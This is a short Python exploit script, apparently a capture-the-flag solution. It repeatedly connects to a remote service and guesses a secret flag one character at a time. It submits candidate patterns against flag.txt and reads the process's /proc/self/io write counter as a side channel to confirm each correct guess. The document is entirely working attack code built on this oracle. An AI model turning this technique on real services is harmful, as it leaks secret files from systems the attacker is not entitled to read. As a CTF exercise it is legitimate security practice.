from pwn import *

# context.log_level = "debug"
candidate = b"abcdefghijklmnopqrstuvwxyz_}"
pattern = b"Alpaca{"

while not pattern.endswith(b"}"):
    for i in candidate:
        p = remote("34.170.146.252", 44121)
        p.sendlineafter(b"txt): ", b"flag.txt")
        p.sendlineafter(b"Pattern: ", pattern+bytes([i]))
        print(pattern+bytes([i]))

        for _ in range(3):
            p.sendlineafter(b"txt): ", b"")
            p.sendlineafter(b"Pattern: ", b"aaaaaaaaaaaaaaaaaaaaaaaaaaa")

        p.sendlineafter(b"txt): ", b"/proc/self/io")
        p.sendlineafter(b"Pattern: ", b"")

        p.recvuntil(b"wchar: ")
        wchar = int(p.recvline().strip())

        if wchar == 123240:
            pattern += bytes([i])
            print(pattern)
            p.close()
            break
        else:
            p.close()
